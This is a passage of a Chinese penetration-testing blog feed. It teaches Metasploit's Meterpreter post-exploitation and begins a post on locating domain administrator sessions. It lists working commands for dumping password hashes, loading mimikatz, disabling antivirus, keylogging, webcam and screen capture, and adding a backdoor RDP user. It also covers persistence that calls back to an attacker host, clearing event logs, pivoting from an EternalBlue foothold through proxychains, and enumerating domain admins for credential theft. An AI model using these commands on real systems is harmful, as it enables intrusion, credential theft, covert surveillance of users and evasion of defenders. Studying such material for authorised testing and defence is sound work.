（重新）协商会话上的 TLV 数据包加密<br>sessions                      快速切换到另一个会话<br>set_timeouts                  设置当前会话超时值<br><span class="hljs-built_in">sleep</span>                         强制 Meterpreter 安静，然后重新建立会话<br>ssl_verify                    修改 SSL 证书验证设置<br>transport                     管理运输机制<br>use                           不推荐使用的load命令别名<br>uuid                          获取当前会话的 UUID<br>write                         将数据写入通道<br><br>==========================================<br>Stdapi：文件系统命令<br>==========================================<br><br>命令                           说明<br>-------                       ------------<br><span class="hljs-built_in">cat</span>                           将文件内容读到屏幕上<br><span class="hljs-built_in">cd</span>                            切换目录<br>checksum                      检索文件的校验和<br><span class="hljs-built_in">cp</span>                            将源复制到目标<br>del                           删除指定文件<br><span class="hljs-built_in">dir</span>                           列出文件（<span class="hljs-built_in">ls</span> 的别名）<br>download                      下载文件或目录<br>edit                          编辑文件<br>getlwd                        打印本地工作目录<br>getwd                         打印工作目录<br>lcd                           更改本地工作目录<br>lls                           列出本地文件<br>lpwd                          打印本地工作目录<br><span class="hljs-built_in">ls</span>                            列出文件<br><span class="hljs-built_in">mkdir</span>                         制作目录<br><span class="hljs-built_in">mv</span>                            将源移动到目标<br><span class="hljs-built_in">pwd</span>                           打印工作目录<br><span class="hljs-built_in">rm</span>                            删除指定文件<br><span class="hljs-built_in">rmdir</span>                         删除目录<br>search                        搜索文件<br>show_mount                    列出所有挂载点/逻辑驱动器<br>upload                        上传文件或目录<br><br>==========================================<br>Stdapi：网络命令<br>==========================================<br>命令                           说明<br>-------                       ------------<br>arp                           显示主机 ARP 缓存<br>getproxy                      显示当前代理配置<br>ifconfig                      显示界面<br>ipconfig                      显示接口<br>netstat                       显示网络连接<br>portfwd                       将本地端口转发到远程服务<br>resolve                       解析目标上的一组主机名<br>route                         查看和修改路由表<br><br>==========================================<br>Stdapi：系统命令<br>==========================================<br>命令                           说明<br>-------                       ------------<br>clearev                       清除事件日志<br>drop_token                    放弃任何活动的模拟令牌。<br>execute                       执行命令<br>getenv                        获取一个或多个环境变量值<br>getpid                        获取当前进程标识符<br>getprivs                      尝试启用当前进程可用的所有权限<br>getid                         获取服务器运行的用户的 SID<br>getuid                        获取服务器运行的用户<br><span class="hljs-built_in">kill</span>                          终止进程<br>localtime                     显示目标系统本地日期和时间<br>pgrep                         按名称过滤进程<br>pkill                         按名称终止进程<br>ps                            列出正在运行的进程<br>reboot                        重启远程计算机<br>reg                           修改远程注册表并与之交互<br>rev2self                      在远程机器上调用 RevertToSelf()<br>shell                         放入系统命令 shell<br>shutdown                      关闭远程计算机<br>steal_token                   尝试从目标进程窃取模拟令牌<br><span class="hljs-built_in">suspend</span>                       暂停或恢复进程列表<br>sysinfo                       获取有关远程系统的信息，例如 OS<br><br>==========================================<br>Stdapi：用户界面命令<br>==========================================<br>命令                           说明<br>-------                       ------------<br>enumdesktops                  列出所有可访问的桌面和窗口站<br>getdesktop                    获取当前的meterpreter桌面<br>idletime                      返回远程用户空闲的秒数<br>keyboard_send                 发送击键<br>keyevent                      发送按键事件<br>keyscan_dump                  转储击键缓冲区<br>keyscan_start                 开始捕获击键<br>keyscan_stop                  停止捕获击键<br>mouse                         发送鼠标事件<br>screenshare                   实时观看远程用户桌面<br>screenshot                    抓取交互式桌面的截图<br>setdesktop                    更改meterpreters当前桌面<br>uictl                         控制一些用户界面组件<br><br>==========================================<br>Stdapi：网络摄像头命令：<br>==========================================<br>命令                           说明<br>-------                       ------------<br>record_mic                    从默认麦克风录制音频 X 秒<br>webcam_chat                   开始视频聊天<br>webcam_list                   列出网络摄像头<br>webcam_snap                   从指定的网络摄像头拍摄快照<br>webcam_stream                 从指定的网络摄像头播放视频流<br><br>==========================================<br>Stdapi：音频输出命令：<br>==========================================<br>命令                           说明<br>-------                       ------------<br>play                          在目标系统上播放波形音频文件 (.wav)<br><br>==========================================<br>Priv：权限提升命令：<br>==========================================<br>命令                           说明<br>-------                       ------------<br>getsystem                     尝试将您的权限提升到本地系统的权限。<br><br>==========================================<br>Priv：密码数据库命令：<br>==========================================<br>命令                           说明<br>-------                       ------------<br>hashdump                      转储 SAM 数据库的内容<br><br>==========================================<br>Priv：Timestomp 命令：<br>==========================================<br>命令                           说明<br>-------                       ------------<br>timestomp                     操作文件 MACE 属性<br><br>meterpreter &gt;<br></code></pre></td></tr></table></figure><p>我们输入： <code>shell</code>即可切换到目标主机的<code>windows cmd_shell</code>里面：<br>命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">shell         <span class="hljs-comment">#获取目标主机的cmd_shell权限</span><br>chcp 65001    <span class="hljs-comment">#这里为了避免目标主机cmd_shell字符乱码，设置目标主机命令行的字符编码，65001是UTF-8</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107205853047.png" alt="image-20240107205853047"></p><p>要想从目标主机shell退出到<code>meterpreter</code> ，我们只需输入：<code>exit</code>:</p><p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107205915153.png" alt="image-20240107205915153"></p><p>从<code>meterpreter</code>退出到<code>MSF框架</code>:<br>命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">background   <span class="hljs-comment">#把我们获得的meterpreter会话挂载到后台运行</span><br></code></pre></td></tr></table></figure><p>查看前面获得的<code>meterpreter_shell</code>会话，最前面的数字是会话的id：<br>命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sessions  -l    <span class="hljs-comment">#查看获得的meterpreter_shell会话列表</span><br></code></pre></td></tr></table></figure><p>输入sessions [id号]即可进入相应的<code>meterpreter_shell</code>中：</p><p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107210018273.png" alt="image-20240107210018273"></p><p>输入：shell即可进入 cmd 类型的控制，再输入：powershell，即可进入 powershell 类型的控制台:</p><p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107210038608.png" alt="image-20240107210038608"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">sysinfo             <span class="hljs-comment">#查看目标主机系统信息</span><br>run scraper         <span class="hljs-comment">#查看目标主机详细信息</span><br>run hashdump        <span class="hljs-comment">#导出密码的哈希</span><br>load kiwi           <span class="hljs-comment">#加载mimikatz</span><br>ps                  <span class="hljs-comment">#查看目标主机进程信息</span><br><span class="hljs-built_in">pwd</span>                 <span class="hljs-comment">#查看目标当前目录(windows)</span><br>getlwd              <span class="hljs-comment">#查看目标当前目录(Linux)</span><br>search -f *.jsp -d e:\                <span class="hljs-comment">#搜索E盘中所有以.jsp为后缀的文件</span><br>download  e:\test.txt  /root          <span class="hljs-comment">#将目标机的e:\test.txt文件下载到/root目录下</span><br>upload    /root/test.txt d:\<span class="hljs-built_in">test</span>      <span class="hljs-comment">#将/root/test.txt上传到目标机的 d:\test\ 目录下</span><br>getpid             <span class="hljs-comment">#查看当前Meterpreter Shell的进程PID</span><br>migrate 1384        <span class="hljs-comment">#将当前Meterpreter Shell的进程迁移到PID为1384的进程上</span><br>idletime            <span class="hljs-comment">#查看主机运行时间</span><br>getuid              <span class="hljs-comment">#查看获取的当前权限</span><br>getsystem           <span class="hljs-comment">#提权,获得的当前用户是administrator才能成功</span><br>run  killav         <span class="hljs-comment">#关闭杀毒软件</span><br>screenshot          <span class="hljs-comment">#截图</span><br>webcam_list         <span class="hljs-comment">#查看目标主机的摄像头</span><br>webcam_snap         <span class="hljs-comment">#拍照</span><br>webcam_stream       <span class="hljs-comment">#开视频</span><br>execute 参数 -f 可执行文件       <span class="hljs-comment">#执行可执行程序</span><br>run getgui -u test1 -p Abc123456    <span class="hljs-comment">#创建test1用户，密码为Abc123456</span><br>run getgui -e                <span class="hljs-comment">#开启远程桌面</span><br>keyscan_start                <span class="hljs-comment">#开启键盘记录功能</span><br>keyscan_dump                 <span class="hljs-comment">#显示捕捉到的键盘记录信息</span><br>keyscan_stop                 <span class="hljs-comment">#停止键盘记录功能</span><br>uictl  <span class="hljs-built_in">disable</span>  keyboard     <span class="hljs-comment">#禁止目标使用键盘</span><br>uictl  <span class="hljs-built_in">enable</span>   keyboard     <span class="hljs-comment">#允许目标使用键盘</span><br>uictl  <span class="hljs-built_in">disable</span>  mouse        <span class="hljs-comment">#禁止目标使用鼠标</span><br>uictl  <span class="hljs-built_in">enable</span>   mouse        <span class="hljs-comment">#允许目标使用鼠标</span><br>load                        <span class="hljs-comment">#使用扩展库</span><br>run             <span class="hljs-comment">#使用扩展库</span><br> <br>run exploit/windows/local/persistence lhost=192.168.100.132 lport=8888        <span class="hljs-comment">#会自动连接192.168.100.132的8888端口，缺点是容易被杀毒软件查杀</span><br>portfwd add -l 9999 -r 192.168.100.158 -p 3389     <span class="hljs-comment">#将192.168.11.13的3389端口转发到本地的9999端口上，这里的192.168.100.158是获取权限的主机的ip地址</span><br>clearev                       <span class="hljs-comment">#清除日志</span><br></code></pre></td></tr></table></figure></li><li><h6 id="Post-后渗透模块"><a href="#Post-后渗透模块" class="headerlink" title="Post 后渗透模块"></a>Post 后渗透模块</h6><p>该模块主要用于在取得目标主机系统远程控制权后，进行一系列的后渗透攻击动作。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">run post/windows/manage/migrate                <span class="hljs-comment">#自动进程迁移</span><br>run post/windows/gather/checkvm                <span class="hljs-comment">#查看目标主机是否运行在虚拟机上</span><br>run post/windows/manage/killav                <span class="hljs-comment">#关闭杀毒软件</span><br>run post/windows/manage/enable_rdp            <span class="hljs-comment">#开启远程桌面服务</span><br>run post/windows/manage/autoroute              <span class="hljs-comment">#查看路由信息</span><br>run post/windows/gather/enum_logged_on_users    <span class="hljs-comment">#列举当前登录的用户</span><br>run post/windows/gather/enum_applications       <span class="hljs-comment">#列举应用程序</span><br>run post/windows/gather/credentials/windows_autologin <span class="hljs-comment">#抓取自动登录的用户名和密码</span><br>run post/windows/gather/smart_hashdump               <span class="hljs-comment">#dump出所有用户的hash</span><br></code></pre></td></tr></table></figure><p>查看主机是否运行在虚拟机上，可以看出主机是在虚拟机环境：<br>命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">run post/windows/gather/checkvm<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107210350087.png" alt="image-20240107210350087"></p><p>拿到目标主机的shell后第一件事就是关闭掉目标主机的杀毒软件，通过命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">run  killav<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107210422413.png" alt="image-20240107210422413"></p><p>获取目标主机的详细信息</p><p>命令:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">run scraper <br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107210505550.png" alt="image-20240107210505550"></p><p>它将目标机器上的常见信息收集起来然后下载保存在本地</p></li></ul><h6 id="上传-x2F-下载文件"><a href="#上传-x2F-下载文件" class="headerlink" title="上传&#x2F;下载文件"></a>上传&#x2F;下载文件</h6><p>  命令：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">download  file <span class="hljs-comment">#命令可以帮助我们从目标系统中下载文件</span><br></code></pre></td></tr></table></figure>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">upload  file  <span class="hljs-comment">#命令则能够向目标系统上传文件。</span><br></code></pre></td></tr></table></figure><h6 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h6><p>  命令：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">getuid<br><span class="hljs-comment">#命令可以获取当前用户的信息，可以看到，当我们使用 getsystem进行提权后，用户身材为  NT AUTHORITY\SYSTEM ，这个也就是Windows的系统权限。</span><br>getsystem<br><span class="hljs-comment">#自动提权为系统权限</span><br></code></pre></td></tr></table></figure><p>  <img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107210650338.png" alt="image-20240107210650338"></p><p>  注：执行getsystem命令后，会显示错误，但是其实已经运行成功了！</p><h5 id="运行程序："><a href="#运行程序：" class="headerlink" title="运行程序："></a>运行程序：</h5><p>  先查看目标主机安装了哪些应用：<br>  命令：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">run post/windows/gather/enum_applications  <span class="hljs-comment">#查看目标主机安装了哪些应用</span><br></code></pre></td></tr></table></figure><p>  <img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107210722073.png" alt="image-20240107210722073"></p><p>  在meterpreter_shell命令行执行目标系统中的应用程序：<br>  命令:</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#execute命令用法：</span><br>execute [参数] -f 指定的可执行文件<br><br>-f：指定可执行文件<br>-H：创建一个隐藏进程<br>-a：传递给命令的参数<br>-i：跟进程进行交互<br>-m：从内存中执行<br>-t：使用当前伪造的线程令牌运行进程<br>-s：在给定会话中执行进程<br></code></pre></td></tr></table></figure><p>  <img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107210807916.png" alt="image-20240107210807916"></p><p>  开启远程桌面：<br>  命令：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">run post/windows/manage/enable_rdp<br></code></pre></td></tr></table></figure><p>  先查看目标主机有哪些用户：<br>  命令：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">run post/windows/gather/enum_logged_on_users  <span class="hljs-comment">#查看目标主机有用户</span><br></code></pre></td></tr></table></figure><h4 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h4><p>  1、配置路由</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#配置静态路由让这个session3来转发访问192.168.52.0/24这个网段的所有流量``msf &gt; run autoroute -s 192.168.52.0/24</span><br></code></pre></td></tr></table></figure><p>  2、使用background命令将该shell放在后台，使用route print查看配置是否成功</p><p>  3、msf开启sock4代理</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf &gt; use auxiliary/server/socks_proxy<br>msf &gt; <span class="hljs-built_in">set</span> version 4a<br>msf &gt; <span class="hljs-built_in">set</span> srvhost 192.168.118.128&lt;br&gt;<br>msf &gt; <span class="hljs-built_in">set</span> srvport 1080<br>msf &gt; exploit<br></code></pre></td></tr></table></figure><p>  此时已经开启代理监听在1080端口</p><p>  4、修改&#x2F;etc&#x2F;proxychains4.conf文件，即proxychains配置文件</p><p>  <img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107211506563.png" alt="image-20240107211506563"></p><h4 id="portfwd端口转发"><a href="#portfwd端口转发" class="headerlink" title="portfwd端口转发"></a>portfwd端口转发</h4><p>  portfwd是meterpreter提供的一种基本的端口转发。porfwd可以反弹单个端口到本地，并且监听，使用方法如下:</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">portfwd add -l 9999 -r 192.168.100.158 -p 3389   <br><span class="hljs-comment">#将192.168.100.158的3389端口转发到本地的9999端口上，这里的192.168.100.158是获取权限的主机的ip地址</span><br>-l:   <span class="hljs-comment">#本地监听的端口，用于接收目标主机的端口反弹</span><br>-p:   <span class="hljs-comment">#目标服务器的端口；</span><br>add:  <span class="hljs-comment">#添加一个连接</span><br></code></pre></td></tr></table></figure><p>  然后我们只要访问本地的3389端口就可以连接到目标主机的3389端口了:</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">rdesktop 127.0.0.1:9999<br><span class="hljs-comment">#因为通过端口转发功能已经把3389的流量转发到本地的9999端口，所以只要连接本地的9999端口就相当于连接了目标机器的3389端口；</span><br></code></pre></td></tr></table></figure><p>  如果不想继续连接的话，可以删除当前建立的连接，执行以下命令：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">portfwd delet -l 9999 -r 192.168.100.158 -p 3389   <br>delet:  <span class="hljs-comment">#删除一个连接</span><br></code></pre></td></tr></table></figure><h1 id="实战演示"><a href="#实战演示" class="headerlink" title="实战演示"></a><strong>实战演示</strong></h1><p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107183413048.png" alt="image-20240107183413048"></p><ul><li>通过永恒之蓝拿到跳板机<br><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107183420867.png" alt="image-20240107183420867"></li><li>拿到跳板机之后添加路由<br><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107183430002.png" alt="image-20240107183430002"></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">添加攻击IP添加到目标机路由表中<br><br>也可以 run autoroute -s 10.10.10.0/24<br><br>或者手动添加<br><br>route add 10.10.10.0 255.255.255.0<br></code></pre></td></tr></table></figure><ul><li>接下来设置代理<br><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107183438812.png" alt="image-20240107183438812"></li></ul><p>接下来用kali上的神奇proxychains</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi /etc/proxychains.conf<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107183447125.png" alt="image-20240107183447125"><br>测试是否能连内网的机器<br><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107183455089.png" alt="image-20240107183455089"><br>可以成功连接<br>通过代理工具开启msf<br><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107183506484.png" alt="image-20240107183506484"><br>接下来就可以直接搞内网了。实战中可能有多层网段。就需要挂多层代理</p><p>msf中有很多  攻击载荷模块，嗅探模块和后渗透模块。大家后期可以深入的去研究研究。</p>]]></content>
    
    
    <categories>
      
      <category>工具使用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>msf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>查找域管理员进程</title>
    <link href="/2022/06/15/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/"/>
    <url>/2022/06/15/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在渗透测试中，一个典型的域权限提升过程，通常围绕着收集明文凭据或通过mimikatz提权等方法，在获取了管理员权限的系统中寻找域管理员登录进程，进而收集域管理员的凭据。如果内网环境非常复杂，渗透测试人员无法立即在拥有权限的系统中获得域管理员进程，那么通常采用的方法是：在跳板机之间跳转，直至获得域管理员权限，同时进行一些分析工作，进而找到渗透测试的路径。</p><p>现在我们来假设一种情况：渗透测试人员在某个内网环境中获得一个域普通用户的权限，首先通过各种方法获得当前服务器的本地管理员权限，然后分析当前服务器的用户登录列表及会话信息，知道哪些用户登录了这台服务器。如果渗透测试人员通过分析发现，可以获取权限的登录用户都不是域管理员账户，同时没有域管理员组中的用户登录这台服务器，就可以使用另一个账户并寻找账户在内网的哪台机器上具有管理权限，再枚举这台机器上的用户，然后继续进行渗透测试，直至找到一个可以获取域管理员权限的有效路径为止。</p><p><strong>1.1本机检查</strong></p><ul><li>获取域管理员列表</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">net group <span class="hljs-string">&quot;Domain Admins&quot;</span> /domain<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/image-20240107154344780.png" alt="image-20240107154344780"></p><ul><li>列出本机的所有进程及进程用户</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tasklist  /v<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/image-20240107154353749.png" alt="image-20240107154353749">列入箭头所指如果为管理员那就可做令牌劫持拿到管理员权限</p><p><strong>1.2 查询域控制器的域用户会话</strong><br>查询域控制器的域用户会话，其原理是：在域控制器中查询域用户会话列表，并将其与域管理员列表进行交叉引用，从而得到域管理员会话的系统列表。</p><ul><li>查询域控制器列表</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">net group <span class="hljs-string">&quot;Domain Controllers&quot;</span> /domain<br></code></pre></td></tr></table></figure><ul><li>收集域管理员列表<br><img src="/2022/06/15/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/image-20240107154402579.png" alt="image-20240107154402579"></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">net group <span class="hljs-string">&quot;Domain Admins&quot;</span> /domain<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/image-20240107154411641.png" alt="image-20240107154411641"></p><ul><li>收集所有活动域的会话列表</li></ul><p>使用netsess.exe查询每个域控制器，收集所有活动域会话列表。netsess.exe是一个很棒的工具，它包含本地windows函数netsessionenum。<br><img src="/2022/06/15/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/image-20240107154432148.png" alt="image-20240107154432148"><br>有会话才有信息，否则就没有</p><ul><li>交叉引用域管理员列表与活动会话列表</li></ul><p>对域管理员列表和活动会话列表进行交叉引用，可以确定那些IP地址有活动域令牌。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">net localgroup <span class="hljs-string">&quot;Domain Controllers&quot;</span> /domain &gt; dcs.txt<br>net localgroup <span class="hljs-string">&quot;Domian Admins&quot;</span> /domain &gt; admins.txt<br></code></pre></td></tr></table></figure><p>然后运行一下脚本，会在当前目录下生成一个文本文件sessions.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">FOR /F %i <span class="hljs-keyword">in</span> (dcs.txt) <span class="hljs-keyword">do</span> @<span class="hljs-built_in">echo</span> [+] Querying DC %i &amp;&amp; @netsess -h %i 2&gt;null &gt;sessions.txt &amp;&amp; FOR /F %a <span class="hljs-keyword">in</span> (admins.txt) DO @<span class="hljs-built_in">type</span> sessions.txt | @findstr /I %a<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/image-20240107154441138.png" alt="image-20240107154441138"><br><img src="/2022/06/15/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/image-20240107154449409.png" alt="image-20240107154449409">这里因为没有会话所以没有内容。</p><p><strong>2.1 查询远程系统中运行的任务</strong><br>如果目标机器在域系统中是通过共享的本地管理员账户运行的，就可以使用下列脚本来查询系统中的域管理任务。<br>首先，从Domain Admins组中收集域管理员列表。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">net group <span class="hljs-string">&quot;Domain Admins&quot;</span> /domain &gt; 